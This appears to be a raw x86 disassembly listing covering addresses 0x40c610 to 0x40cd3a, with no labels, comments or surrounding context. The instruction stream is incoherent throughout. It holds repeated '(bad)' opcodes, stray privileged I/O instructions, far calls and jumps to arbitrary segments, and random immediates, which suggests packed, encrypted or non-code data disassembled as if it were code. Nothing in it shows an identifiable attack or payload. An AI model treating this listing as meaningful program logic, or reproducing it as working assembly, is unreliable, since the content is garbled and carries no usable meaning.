  40c610:	rol    ah,cl
  40c612:	shl    DWORD PTR [ebx-0x3e99919],0x1
  40c619:	call   0x1339:0x39ed93e5
  40c620:	cmp    BYTE PTR [ebx-0x8],ah
  40c623:	sbb    DWORD PTR [eax+ecx*2+0x17ef6062],0xd8285430
  40c62e:	and    dh,BYTE PTR [ecx]
  40c630:	retf   
  40c631:	fcmovne st,st(0)
  40c633:	fsubr  st,st(1)
  40c635:	pop    esi
  40c636:	test   bl,dl
  40c638:	mov    ebx,0xcace2358
  40c63d:	cwde   
  40c63e:	dec    edi
  40c63f:	pop    ss
  40c640:	rol    BYTE PTR [ebx],cl
  40c642:	add    eax,eax
  40c644:	dec    esi
  40c645:	push   ecx
  40c646:	mov    dl,0xb9
  40c648:	outs   dx,BYTE PTR ds:[esi]
  40c649:	fnstenv [esi-0x73a737c6]
  40c64f:	and    DWORD PTR [esi+eiz*8+0x556fac41],ebx
  40c656:	dec    ebx
  40c657:	add    al,0x43
  40c659:	dec    esi
  40c65a:	out    0xb0,eax
  40c65c:	pop    edi
  40c65d:	cmc    
  40c65e:	cmp    bl,BYTE PTR ds:0x9a070dfa
  40c664:	cmp    DWORD PTR [ebx+0x29a0b3c4],ebp
  40c66a:	lahf   
  40c66b:	sub    ah,BYTE PTR [ecx]
  40c66d:	cmp    eax,0xbc859f9
  40c672:	xchg   ebx,eax
  40c673:	xchg   ebx,eax
  40c674:	popf   
  40c675:	pop    ebp
  40c676:	inc    edx
  40c677:	fdiv   DWORD PTR [eax-0x25]
  40c67a:	(bad)  
  40c67b:	fst    QWORD PTR [edi]
  40c67d:	addr16 aaa 
  40c67f:	pop    edx
  40c680:	adc    DWORD PTR [edi+eax*8-0x26],0xffffff91
  40c685:	fs jl  0x40c660
  40c688:	not    edx
  40c68a:	and    edi,DWORD PTR [eax]
  40c68c:	js     0x40c6f6
  40c68e:	sub    edx,ebx
  40c690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c691:	mov    dl,0x5f
  40c693:	or     edx,esi
  40c695:	mov    esp,0xc5d9219
  40c69a:	enter  0xc03a,0x64
  40c69e:	cwde   
  40c69f:	push   eax
  40c6a0:	(bad)  
  40c6a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a2:	outs   dx,DWORD PTR ds:[esi]
  40c6a3:	xor    al,0xb1
  40c6a5:	(bad)  
  40c6a6:	vaddpd ymm3,ymm7,YMMWORD PTR [esi+edi*8+0x19]
  40c6ac:	push   ds
  40c6ad:	(bad)  
  40c6ae:	loop   0x40c648
  40c6b0:	or     eax,0x6e44289c
  40c6b5:	mov    eax,0xca0c8c37
  40c6ba:	daa    
  40c6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6bc:	scas   eax,DWORD PTR es:[edi]
  40c6bd:	in     eax,0xbd
  40c6bf:	inc    eax
  40c6c0:	lock call 0x64d1:0x722d3aa9
  40c6c8:	or     DWORD PTR [esi+0x5],ecx
  40c6cb:	pushf  
  40c6cc:	dec    edi
  40c6cd:	xchg   ebp,eax
  40c6ce:	icebp  
  40c6cf:	sbb    DWORD PTR [esi],esp
  40c6d1:	pop    edi
  40c6d2:	pop    ebp
  40c6d3:	inc    ebp
  40c6d4:	jno    0x40c737
  40c6d6:	pop    edx
  40c6d7:	imul   eax,DWORD PTR [eax+0x2ab9bd9c],0x2d5a46eb
  40c6e1:	ds ss cwde 
  40c6e4:	or     DWORD PTR [esi-0x9],ebx
  40c6e7:	test   BYTE PTR [ecx+0x70],ah
  40c6ea:	add    ebx,ecx
  40c6ec:	jle    0x40c702
  40c6ee:	std    
  40c6ef:	cli    
  40c6f0:	into   
  40c6f1:	rcl    DWORD PTR [ebp+0x4d537b2],cl
  40c6f7:	push   esp
  40c6f8:	stos   BYTE PTR es:[edi],al
  40c6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6fa:	not    DWORD PTR [ecx]
  40c6fc:	mov    al,0x98
  40c6fe:	and    ebp,DWORD PTR [ebx+0x16]
  40c701:	lahf   
  40c702:	mov    eax,ds:0x6778b54
  40c707:	cmp    bl,BYTE PTR [edi-0x7]
  40c70a:	loop   0x40c724
  40c70c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c70d:	mov    ch,BYTE PTR [ebx]
  40c70f:	inc    ecx
  40c710:	ins    DWORD PTR es:[edi],dx
  40c711:	test   DWORD PTR [eax],ebp
  40c713:	test   DWORD PTR [ebx+esi*4+0xb],0x525ebc7e
  40c71b:	popf   
  40c71c:	clc    
  40c71d:	ds clc 
  40c71f:	jle    0x40c6e3
  40c721:	pop    ebp
  40c722:	int3   
  40c723:	push   edi
  40c724:	cs push edx
  40c726:	es jo  0x40c717
  40c729:	mov    edx,0x18c85cc5
  40c72e:	call   0xec6618d8
  40c733:	(bad)  
  40c734:	mov    bl,0x8b
  40c736:	imul   DWORD PTR [edi-0x4e042500]
  40c73c:	sub    eax,0xb29350a7
  40c741:	rcl    DWORD PTR [edx],cl
  40c743:	in     al,0xa0
  40c745:	loopne 0x40c6e0
  40c747:	xor    eax,0xb14e9db2
  40c74c:	gs daa 
  40c74e:	mov    ebx,DWORD PTR [edx]
  40c750:	das    
  40c751:	outs   dx,DWORD PTR ds:[esi]
  40c752:	shr    ebp,0x15
  40c755:	lahf   
  40c756:	sub    al,0x24
  40c758:	out    0x53,al
  40c75a:	xor    ebx,esi
  40c75c:	inc    edi
  40c75d:	retf   0xa107
  40c760:	pop    edi
  40c761:	xchg   esp,eax
  40c762:	jg     0x40c7bb
  40c764:	mov    bl,0x12
  40c766:	jb     0x40c78a
  40c768:	mov    esi,0x4e2a5885
  40c76d:	mov    dh,0x8a
  40c76f:	add    DWORD PTR [ebx],edi
  40c771:	pop    ebp
  40c772:	nop
  40c773:	mov    bl,0x1f
  40c775:	xor    al,0x20
  40c777:	push   0xffffffaa
  40c779:	inc    edx
  40c77a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c77b:	jmp    0x937f:0x7674b717
  40c782:	mov    dl,0x9b
  40c784:	out    0x82,al
  40c786:	stc    
  40c787:	ret    
  40c788:	jbe    0x40c720
  40c78a:	iret   
  40c78b:	or     cl,BYTE PTR [ebp+0x29]
  40c78e:	mov    ah,0xfb
  40c790:	test   al,0x65
  40c792:	test   BYTE PTR [esi],bl
  40c794:	push   eax
  40c795:	addr16 dec esi
  40c797:	loopne 0x40c76d
  40c799:	sahf   
  40c79a:	dec    ebx
  40c79b:	inc    ebx
  40c79c:	xor    BYTE PTR [eax+ebp*1+0x59daacc7],bl
  40c7a3:	mov    cl,0x90
  40c7a5:	fsubp  st(1),st
  40c7a7:	pop    ss
  40c7a8:	xchg   edx,eax
  40c7a9:	rol    DWORD PTR ds:0xf75f79b1,1
  40c7af:	loopne 0x40c80a
  40c7b1:	clc    
  40c7b2:	cmp    DWORD PTR [ecx],ecx
  40c7b4:	(bad)  
  40c7b5:	pop    ebx
  40c7b6:	mov    ebp,edi
  40c7b8:	es mov ah,0xbe
  40c7bb:	pusha  
  40c7bc:	add    eax,0x82720f04
  40c7c1:	lods   eax,DWORD PTR ds:[esi]
  40c7c2:	dec    ecx
  40c7c3:	pop    ds
  40c7c4:	lahf   
  40c7c5:	push   ds
  40c7c6:	xor    bl,cl
  40c7c8:	int3   
  40c7c9:	pop    ebp
  40c7ca:	pop    eax
  40c7cb:	or     DWORD PTR [edx-0x3],ecx
  40c7ce:	sub    al,0x4f
  40c7d0:	cmp    eax,0x8e30a95d
  40c7d5:	lods   al,BYTE PTR ds:[esi]
  40c7d6:	pop    edi
  40c7d7:	rcl    BYTE PTR [edx+0x18],0x2b
  40c7db:	push   eax
  40c7dc:	mov    esi,ecx
  40c7de:	xchg   ebp,eax
  40c7df:	icebp  
  40c7e0:	xchg   edx,eax
  40c7e1:	mov    dl,bl
  40c7e3:	repz (bad) [ebp+0x26e41794]
  40c7ea:	pop    ecx
  40c7eb:	mov    esp,0x4c7b6b15
  40c7f0:	xlat   BYTE PTR ds:[ebx]
  40c7f1:	jg     0x40c835
  40c7f3:	mov    ecx,0x351b1e02
  40c7f8:	sbb    bh,BYTE PTR [ebx]
  40c7fa:	ja     0x40c866
  40c7fc:	push   0x22
  40c7fe:	loope  0x40c808
  40c800:	pcmpgtd mm0,QWORD PTR [ebx-0x26c98f37]
  40c807:	aas    
  40c808:	pop    ecx
  40c809:	jge    0x40c814
  40c80b:	test   DWORD PTR [edx],esp
  40c80d:	loopne 0x40c84e
  40c80f:	push   DWORD PTR [ecx+0x110f232d]
  40c815:	push   ebp
  40c816:	arpl   cx,bp
  40c818:	fnstenv [eax-0x60]
  40c81b:	pusha  
  40c81c:	sub    BYTE PTR [edx-0x23],0xef
  40c820:	pop    ecx
  40c821:	dec    eax
  40c822:	cli    
  40c823:	dec    esp
  40c824:	fld    QWORD PTR [ebx-0x40]
  40c827:	xchg   ebp,eax
  40c828:	fstp   DWORD PTR [esi+0x296e99c9]
  40c82e:	pop    edx
  40c82f:	cli    
  40c830:	(bad)  
  40c831:	or     al,dh
  40c833:	mov    ecx,0xf0bfba0
  40c838:	pop    ecx
  40c839:	pop    ebp
  40c83a:	lea    di,[edx+0xa]
  40c83e:	mov    DWORD PTR [edi],esp
  40c840:	jecxz  0x40c87c
  40c842:	mov    dl,dh
  40c844:	cmp    al,0xa7
  40c846:	jae    0x40c86c
  40c848:	cdq    
  40c849:	in     al,dx
  40c84a:	cmp    eax,DWORD PTR [ebx+0x6a]
  40c84d:	stos   DWORD PTR es:[edi],eax
  40c84e:	lock fldcw WORD PTR [edi+0x58]
  40c852:	jb     0x40c88f
  40c854:	int    0x15
  40c856:	lods   eax,DWORD PTR ds:[esi]
  40c857:	(bad)  
  40c858:	jo     0x40c7f7
  40c85a:	into   
  40c85b:	sbb    BYTE PTR [eax],cl
  40c85d:	mov    ecx,DWORD PTR [eax-0x54]
  40c860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c861:	(bad)  [eax-0x7bcd77b6]
  40c867:	mov    BYTE PTR [ebx+edi*4+0x4b],al
  40c86b:	mov    esp,0xbdfb0ab3
  40c870:	adc    al,0xde
  40c872:	rol    esp,cl
  40c874:	sub    eax,0x111cfdc
  40c879:	in     eax,0xa1
  40c87b:	je     0x40c8b0
  40c87d:	or     DWORD PTR [ebx-0xd],eax
  40c880:	jg     0x40c8e2
  40c882:	in     eax,0x59
  40c884:	mov    edx,0x220f0102
  40c889:	push   ebx
  40c88a:	xchg   cl,dh
  40c88c:	test   eax,0xc610e1f4
  40c891:	push   ebx
  40c892:	in     eax,0x19
  40c894:	xor    bl,BYTE PTR [ebx]
  40c896:	and    BYTE PTR [eax],ch
  40c898:	dec    eax
  40c899:	cmp    al,0xeb
  40c89b:	sbb    esi,eax
  40c89d:	jnp    0x40c919
  40c89f:	lods   eax,DWORD PTR ds:[esi]
  40c8a0:	imul   edi,DWORD PTR cs:[edi+0x75],0xffffffc3
  40c8a5:	jg     0x40c913
  40c8a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8a8:	rcr    BYTE PTR [ebx],cl
  40c8aa:	push   ebx
  40c8ab:	rol    ebx,cl
  40c8ad:	jns    0x40c863
  40c8af:	aad    0xdb
  40c8b1:	loope  0x40c920
  40c8b3:	scas   al,BYTE PTR es:[edi]
  40c8b4:	mov    bh,0x44
  40c8b6:	lahf   
  40c8b7:	dec    ecx
  40c8b8:	sub    DWORD PTR [edx],edx
  40c8ba:	loop   0x40c912
  40c8bc:	into   
  40c8bd:	test   eax,0xf23e7503
  40c8c2:	and    edx,edi
  40c8c4:	lods   al,BYTE PTR ds:[esi]
  40c8c5:	iret   
  40c8c6:	or     dh,BYTE PTR [esi]
  40c8c8:	adc    BYTE PTR [ecx],bl
  40c8ca:	push   esp
  40c8cb:	scas   eax,DWORD PTR es:[edi]
  40c8cc:	and    eax,DWORD PTR [ecx-0x4f54feae]
  40c8d2:	gs int3 
  40c8d4:	xor    DWORD PTR [eax+0x73953b9c],eax
  40c8da:	mov    ch,0x90
  40c8dc:	jo     0x40c94f
  40c8de:	or     ecx,edx
  40c8e0:	lods   al,BYTE PTR ds:[esi]
  40c8e1:	out    0xee,al
  40c8e3:	push   eax
  40c8e4:	push   es
  40c8e5:	dec    ebx
  40c8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8e7:	call   0x1168:0xf2a06e15
  40c8ee:	or     cl,BYTE PTR [ecx]
  40c8f0:	std    
  40c8f1:	ins    BYTE PTR es:[edi],dx
  40c8f2:	push   ss
  40c8f3:	sub    bh,BYTE PTR [edx]
  40c8f5:	mov    eax,0x26eb8033
  40c8fa:	pop    ebp
  40c8fb:	pop    edx
  40c8fc:	jecxz  0x40c8d2
  40c8fe:	xchg   edx,eax
  40c8ff:	ins    BYTE PTR es:[edi],dx
  40c900:	xor    ch,BYTE PTR [edx-0x3224557f]
  40c906:	adc    ebp,ebp
  40c908:	rcr    BYTE PTR [edi+eiz*8-0x1],cl
  40c90c:	cmp    al,0x91
  40c90e:	lods   al,BYTE PTR ds:[esi]
  40c90f:	std    
  40c910:	cld    
  40c911:	sub    DWORD PTR [eax+0x604a7f49],edi
  40c917:	lock xchg esp,eax
  40c919:	jp     0x40c970
  40c91b:	fs pop edi
  40c91d:	int    0xc2
  40c91f:	enter  0xed66,0xe6
  40c923:	push   esi
  40c924:	jmp    0xd1ec4c54
  40c929:	xchg   DWORD PTR [ebx-0x4b0f9e38],ebx
  40c92f:	mov    ch,0xb
  40c931:	data16 out 0x98,al
  40c934:	ins    DWORD PTR es:[edi],dx
  40c935:	adc    eax,0x3edf685b
  40c93a:	lds    ebp,FWORD PTR [esi+eax*8]
  40c93d:	ficom  DWORD PTR ss:[ebx]
  40c940:	sbb    bh,BYTE PTR [ebx]
  40c942:	int    0x75
  40c944:	sub    DWORD PTR [esi],ecx
  40c946:	pop    ebx
  40c947:	xor    eax,0x7535d7f1
  40c94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c94d:	dec    esp
  40c94e:	pop    ebp
  40c94f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c950:	daa    
  40c951:	lock pop ebx
  40c953:	data16 ficomp WORD PTR [edx+0x5b]
  40c957:	cld    
  40c958:	aaa    
  40c959:	mov    ch,BYTE PTR [edx-0x4aac753b]
  40c95f:	jnp    0x40c948
  40c961:	mov    ds,WORD PTR [edi]
  40c963:	dec    eax
  40c964:	(bad)  
  40c965:	dec    edi
  40c966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c967:	dec    ebx
  40c968:	aam    0xc7
  40c96a:	shl    BYTE PTR [esp+esi*4-0x12],cl
  40c96e:	stc    
  40c96f:	pop    ecx
  40c970:	cli    
  40c971:	data16 rcl BYTE PTR [edx-0xf164a38],cl
  40c978:	dec    ecx
  40c979:	ins    DWORD PTR es:[edi],dx
  40c97a:	popa   
  40c97b:	in     eax,dx
  40c97c:	ins    BYTE PTR es:[edi],dx
  40c97d:	popa   
  40c97e:	push   edi
  40c97f:	or     ch,ch
  40c981:	out    dx,eax
  40c982:	(bad)  
  40c983:	push   edx
  40c984:	mov    dl,0x58
  40c986:	es push 0xffffffe2
  40c989:	jb     0x40c96f
  40c98b:	nop
  40c98c:	pop    ds
  40c98d:	mov    cl,0x17
  40c98f:	dec    ecx
  40c990:	inc    ebp
  40c991:	es das 
  40c993:	fild   WORD PTR [esi+0x19]
  40c996:	call   0x51776e65
  40c99b:	nop
  40c99c:	or     DWORD PTR [edi-0x3],0x7
  40c9a0:	call   0xc502fa8f
  40c9a5:	out    dx,eax
  40c9a6:	pop    ss
  40c9a7:	cmp    DWORD PTR [esi-0x3b],esi
  40c9aa:	std    
  40c9ab:	xchg   edi,eax
  40c9ac:	mov    esp,0xf704be88
  40c9b1:	mov    esp,0xe4e8cefa
  40c9b6:	fwait
  40c9b7:	inc    edx
  40c9b8:	cli    
  40c9b9:	jae    0x40c94e
  40c9bb:	mov    dl,0xf7
  40c9bd:	fxam   
  40c9bf:	pop    ebx
  40c9c0:	pop    ebx
  40c9c1:	xchg   edi,eax
  40c9c2:	add    al,0xbb
  40c9c4:	sub    eax,0xe5849aee
  40c9c9:	push   ss
  40c9ca:	xor    cl,BYTE PTR [esi]
  40c9cc:	leave  
  40c9cd:	mov    edi,0x18b53cce
  40c9d2:	test   al,0x2e
  40c9d4:	or     al,0x56
  40c9d6:	rcl    DWORD PTR [ebx+edi*2-0x4bb0d1f0],cl
  40c9dd:	push   edi
  40c9de:	adc    eax,0xbb0f8bb2
  40c9e3:	cmc    
  40c9e4:	ins    BYTE PTR es:[edi],dx
  40c9e5:	lock and DWORD PTR [eax-0x7dca957e],ebx
  40c9ec:	or     BYTE PTR [ebx],ch
  40c9ee:	push   0x4b59e88f
  40c9f3:	pop    ebp
  40c9f4:	xor    al,BYTE PTR [ebp-0x7f1c1853]
  40c9fa:	scas   eax,DWORD PTR es:[edi]
  40c9fb:	sub    eax,0xa047b692
  40ca00:	popf   
  40ca01:	xchg   edx,eax
  40ca02:	push   edi
  40ca03:	icebp  
  40ca04:	sti    
  40ca05:	adc    eax,0xb7356033
  40ca0a:	mov    dh,0xf8
  40ca0c:	dec    esi
  40ca0d:	push   ds
  40ca0e:	ret    0x437a
  40ca11:	xor    BYTE PTR [ecx-0x50],ch
  40ca14:	fimul  WORD PTR [eax+0x3e]
  40ca17:	add    eax,0x76a34d24
  40ca1c:	jp     0x40c9b9
  40ca1e:	mul    DWORD PTR [eax-0x60]
  40ca21:	jl     0x40ca40
  40ca23:	sbb    eax,0x57617150
  40ca28:	jne    0x40c9fb
  40ca2a:	popf   
  40ca2b:	pop    ds
  40ca2c:	mov    ch,0x51
  40ca2e:	adc    BYTE PTR [edx],ch
  40ca30:	enter  0x2365,0x89
  40ca34:	sbb    al,0x1
  40ca36:	fcomp  st(7)
  40ca38:	cwde   
  40ca39:	sub    edx,edi
  40ca3b:	out    0x20,eax
  40ca3d:	test   bh,ch
  40ca3f:	xchg   ebx,eax
  40ca40:	push   ebp
  40ca42:	pop    esp
  40ca43:	mov    bh,0x6f
  40ca45:	(bad)  
  40ca46:	jns    0x40ca5c
  40ca48:	push   edx
  40ca49:	mov    eax,ds:0x2f825b30
  40ca4e:	push   0xcfb2e56c
  40ca53:	cmp    al,0xab
  40ca55:	rol    DWORD PTR [edi-0x51cf0624],0x95
  40ca5c:	push   0x9eff3c9a
  40ca61:	jmp    0x6aec:0xead058b0
  40ca68:	sub    DWORD PTR [edx+0x2073e26a],edi
  40ca6e:	sahf   
  40ca6f:	pop    ebx
  40ca70:	loopne 0x40caa9
  40ca72:	adc    al,0x53
  40ca74:	inc    ecx
  40ca75:	fwait
  40ca76:	loope  0x40ca69
  40ca78:	xor    BYTE PTR [ecx-0x6ced16fa],0x66
  40ca7f:	adc    DWORD PTR [edi+0x60a645e],ecx
  40ca85:	mov    ?,WORD PTR [eax]
  40ca87:	dec    esi
  40ca88:	aam    0x8d
  40ca8a:	xor    DWORD PTR [eax],ebx
  40ca8c:	xchg   DWORD PTR ds:0xda6129d0,esi
  40ca92:	adc    al,0xe7
  40ca94:	or     esi,ecx
  40ca96:	jo     0x40caa4
  40ca98:	mov    eax,0x580659c0
  40ca9d:	outs   dx,DWORD PTR ds:[esi]
  40ca9e:	mov    eax,DWORD PTR [ecx+0x3877babf]
  40caa4:	adc    ebp,ebp
  40caa6:	cmp    dh,BYTE PTR [ebx-0x1f]
  40caa9:	test   BYTE PTR [ebx-0x64],ch
  40caac:	xchg   esp,eax
  40caad:	push   0x7c469229
  40cab2:	out    dx,eax
  40cab3:	aas    
  40cab4:	push   ebx
  40cab5:	adc    ah,BYTE PTR [esp+esi*4]
  40cab8:	aam    0xab
  40caba:	jmp    0x4c71:0xfb2cafca
  40cac1:	ror    BYTE PTR [esi],cl
  40cac3:	fisub  DWORD PTR [eax-0x59]
  40cac6:	dec    ecx
  40cac7:	mov    WORD PTR [ebx+0x2c],gs
  40caca:	test   al,0x96
  40cacc:	xor    al,0xb1
  40cace:	mov    bh,0x47
  40cad0:	retf   0xec02
  40cad3:	dec    edi
  40cad4:	push   ss
  40cad5:	jp     0x40ca74
  40cad7:	ins    DWORD PTR es:[edi],dx
  40cad8:	cmp    BYTE PTR [edx+0x1719132b],bl
  40cade:	jnp    0x40caa5
  40cae0:	xchg   esi,eax
  40cae1:	cmp    edi,DWORD PTR [esi+0x57c135a1]
  40cae7:	sub    eax,0xbc4d7311
  40caec:	or     BYTE PTR [eax+edi*4+0x16],bl
  40caf0:	es sar esp,cl
  40caf3:	mul    edi
  40caf5:	mov    BYTE PTR [esi+0x47],ch
  40caf8:	mov    ds:0x60d405a0,al
  40cafd:	mov    DWORD PTR [esi],edi
  40caff:	cmp    BYTE PTR [ecx+0x768d83c7],0xd6
  40cb06:	xor    BYTE PTR [eax-0x2b9e0b0a],dl
  40cb0c:	fsub   st(0),st
  40cb0e:	push   ebx
  40cb0f:	ins    BYTE PTR es:[edi],dx
  40cb10:	lods   eax,DWORD PTR ds:[esi]
  40cb11:	xchg   esp,eax
  40cb12:	ins    DWORD PTR es:[edi],dx
  40cb13:	or     dh,BYTE PTR [edi-0x3a0e93cd]
  40cb19:	(bad)  
  40cb1a:	addr16 call 0x7901:0x3d7e16c8
  40cb22:	pop    ds
  40cb23:	jo     0x40cb3b
  40cb25:	xchg   ebx,eax
  40cb26:	ins    BYTE PTR es:[edi],dx
  40cb27:	in     al,0xba
  40cb29:	adc    eax,DWORD PTR [edx+0xa]
  40cb2c:	inc    edx
  40cb2d:	push   es
  40cb2e:	cli    
  40cb2f:	dec    eax
  40cb30:	lock enter 0x57bb,0x68
  40cb35:	cli    
  40cb36:	fmul   QWORD PTR [edi+0x5a]
  40cb39:	test   al,0x6e
  40cb3b:	call   0x124d7359
  40cb40:	mov    ecx,0xc2d45231
  40cb45:	jle    0x40caeb
  40cb47:	adc    eax,0xa1bfd9b3
  40cb4c:	dec    edi
  40cb4d:	not    DWORD PTR [edx]
  40cb4f:	push   ebp
  40cb50:	fcomp  DWORD PTR [ebp+0x673c3327]
  40cb56:	(bad)  
  40cb57:	sbb    al,0xb1
  40cb59:	mov    ebx,0x774c0c31
  40cb5e:	sti    
  40cb5f:	mov    ds,WORD PTR [edx-0x39]
  40cb62:	retf   0xd0c5
  40cb65:	lock les ecx,FWORD PTR [edi+0x46bce3e]
  40cb6c:	xor    dh,ah
  40cb6e:	mov    edi,0x8a5feaef
  40cb73:	lahf   
  40cb74:	lea    eax,[edx+0x5757949d]
  40cb7a:	dec    ebp
  40cb7b:	jb     0x40cb74
  40cb7d:	mov    eax,ds:0x30bf4f3b
  40cb82:	lds    esp,FWORD PTR [edi-0x5e]
  40cb85:	jge    0x40cb85
  40cb87:	push   0xffffffa7
  40cb89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb8a:	adc    cl,dh
  40cb8c:	int3   
  40cb8d:	bound  ecx,QWORD PTR [esi-0x2559aef5]
  40cb93:	jae    0x40cb2e
  40cb95:	jnp    0x40cb88
  40cb97:	sub    DWORD PTR [edi+0x53166e61],ebp
  40cb9d:	fidivr WORD PTR [ebx]
  40cb9f:	pop    eax
  40cba0:	fs loopne 0x40cc1a
  40cba3:	imul   ecx,DWORD PTR [ebp+0x1d85d9e4],0xfffffff3
  40cbaa:	fs test al,0xf8
  40cbad:	cmp    al,0x2e
  40cbaf:	imul   edx,edx,0xffffffef
  40cbb2:	sub    DWORD PTR [esi],esi
  40cbb4:	mov    cl,0xa7
  40cbb6:	ror    DWORD PTR [ebx-0x3b],cl
  40cbb9:	ja     0x40cc37
  40cbbb:	inc    eax
  40cbbc:	pop    ecx
  40cbbd:	cmp    al,0xdb
  40cbbf:	inc    esp
  40cbc0:	ds inc eax
  40cbc2:	fs fs xor dh,ch
  40cbc6:	sti    
  40cbc7:	(bad)  
  40cbc8:	xor    DWORD PTR [edx-0x15461622],eax
  40cbce:	mov    esi,0xa893a9ea
  40cbd3:	mov    edi,0x22da4c06
  40cbd8:	fs jp  0x40cb63
  40cbdb:	mul    ebx
  40cbdd:	outs   dx,DWORD PTR ds:[esi]
  40cbde:	aaa    
  40cbdf:	inc    ecx
  40cbe0:	mov    eax,0xe70c01f7
  40cbe5:	fs fcom st(7)
  40cbe8:	and    dh,ch
  40cbea:	pop    ebx
  40cbeb:	pusha  
  40cbec:	xchg   ebp,eax
  40cbed:	pop    eax
  40cbee:	adc    al,BYTE PTR [ebx+esi*4]
  40cbf1:	sar    dl,cl
  40cbf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbf4:	cdq    
  40cbf5:	jge    0x40cc63
  40cbf7:	das    
  40cbf8:	add    ebx,esp
  40cbfa:	push   esp
  40cbfb:	add    BYTE PTR [esi+0x7d],0xd7
  40cbff:	je     0x40cc28
  40cc01:	jb     0x40cbed
  40cc03:	shl    DWORD PTR [edi+0x54e642eb],0x6c
  40cc0a:	rcr    DWORD PTR [esi-0xf],0x89
  40cc0e:	and    ebp,DWORD PTR [ebx-0x2f]
  40cc11:	mov    ds:0xf0d421d3,eax
  40cc16:	cmp    al,BYTE PTR [ebx-0x60]
  40cc19:	mov    esp,0x948847af
  40cc1e:	jg     0x40cc97
  40cc20:	sbb    esp,DWORD PTR [edx]
  40cc22:	sbb    DWORD PTR ds:0xf13ec5ff,eax
  40cc28:	dec    ecx
  40cc29:	dec    eax
  40cc2a:	mov    ecx,0x4f04b1b9
  40cc2f:	mov    al,0x24
  40cc31:	les    esi,FWORD PTR es:[edx-0x95d8c17]
  40cc38:	and    al,0x8
  40cc3a:	cmp    BYTE PTR [edx-0x22],dh
  40cc3d:	aam    0xb6
  40cc3f:	cmp    BYTE PTR [edi+ebp*1+0x42c5ec57],dh
  40cc46:	cmp    al,BYTE PTR [edi+0x4845038d]
  40cc4c:	mov    ebx,0x5c329359
  40cc51:	pop    es
  40cc52:	fs push esp
  40cc54:	fbld   TBYTE PTR [edi+ebx*2-0x30]
  40cc58:	dec    esi
  40cc59:	pop    ds
  40cc5a:	rol    ah,1
  40cc5c:	jg     0x40cc2b
  40cc5e:	add    DWORD PTR [edi+0x6f5df1b9],ebx
  40cc64:	in     eax,0x8f
  40cc66:	inc    ebp
  40cc67:	adc    DWORD PTR [ebx+0x46c52eee],ebp
  40cc6d:	mov    bl,0xfd
  40cc6f:	inc    esp
  40cc70:	xchg   BYTE PTR [edx+0x31201b54],dh
  40cc76:	sub    esi,DWORD PTR [edx+0x34]
  40cc79:	ins    DWORD PTR es:[edi],dx
  40cc7a:	leave  
  40cc7b:	lea    ebx,[ebx+0x479233a5]
  40cc81:	push   0x6a
  40cc83:	es es retf 0xbecf
  40cc88:	xchg   esp,eax
  40cc89:	fs or  al,0xf
  40cc8c:	pushf  
  40cc8d:	sbb    esi,DWORD PTR [esi+0xede0e64]
  40cc93:	push   esi
  40cc94:	add    DWORD PTR [eax-0x67c55128],0x78
  40cc9b:	inc    edx
  40cc9c:	rcr    esp,1
  40cc9e:	pop    edi
  40cc9f:	das    
  40cca0:	xchg   BYTE PTR [ebp+0x37],ah
  40cca3:	inc    edx
  40cca4:	cdq    
  40cca5:	out    dx,al
  40cca6:	dec    ebx
  40cca7:	in     al,dx
  40cca8:	inc    ecx
  40cca9:	popf   
  40ccaa:	lock test eax,0x1b82c7b4
  40ccb0:	aam    0xeb
  40ccb2:	cmp    dh,bh
  40ccb4:	or     al,BYTE PTR [edx]
  40ccb6:	mov    cl,0x8b
  40ccb8:	dec    edi
  40ccb9:	mov    edi,0xa9bcef33
  40ccbe:	pop    ds
  40ccbf:	add    DWORD PTR [edi+0x15a74f80],ebp
  40ccc5:	dec    eax
  40ccc6:	inc    esi
  40ccc7:	retf   0x55f
  40ccca:	sbb    al,0x58
  40cccc:	xchg   edi,eax
  40cccd:	dec    ebp
  40ccce:	mov    dl,0xdb
  40ccd0:	xchg   esi,eax
  40ccd1:	std    
  40ccd2:	pop    es
  40ccd3:	dec    ecx
  40ccd4:	je     0x40cd2a
  40ccd6:	cli    
  40ccd7:	mov    cl,0xc
  40ccd9:	lods   al,BYTE PTR ds:[esi]
  40ccda:	clc    
  40ccdb:	jns    0x40cc65
  40ccdd:	jge    0x40cd4a
  40ccdf:	mov    BYTE PTR [ecx-0x22],cl
  40cce2:	push   es
  40cce3:	or     ah,bl
  40cce5:	loope  0x40cc93
  40cce7:	cwde   
  40cce8:	je     0x40cd4a
  40ccea:	scas   eax,DWORD PTR es:[edi]
  40cceb:	rcl    BYTE PTR [edi],1
  40cced:	fs mov edi,0x3468456f
  40ccf3:	stos   BYTE PTR es:[edi],al
  40ccf4:	sub    eax,0xbb692e4d
  40ccf9:	stc    
  40ccfa:	cmp    esi,DWORD PTR gs:0xa16b737c
  40cd01:	or     eax,0x55b065a9
  40cd06:	and    edi,0x2731b487
  40cd0c:	xchg   BYTE PTR [eax+0x76328fa6],al
  40cd12:	stc    
  40cd13:	mov    eax,0x98507a4b
  40cd18:	imul   ebx,edx,0xffffffa2
  40cd1b:	sahf   
  40cd1c:	jmp    0x40ccdd
  40cd1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd1f:	push   0x2894d1eb
  40cd24:	jg     0x40ccf4
  40cd26:	push   cs
  40cd27:	cmp    al,BYTE PTR [edx-0x19]
  40cd2a:	test   eax,0x2e230b27
  40cd2f:	push   0xffffffc1
  40cd31:	or     eax,DWORD PTR [ecx]
  40cd33:	pop    edx
  40cd34:	mov    ah,0x3c
  40cd36:	pop    edi
  40cd37:	std    
  40cd38:	sti    
  40cd39:	push   edx
  40cd3a:	rol    esp,0xa7
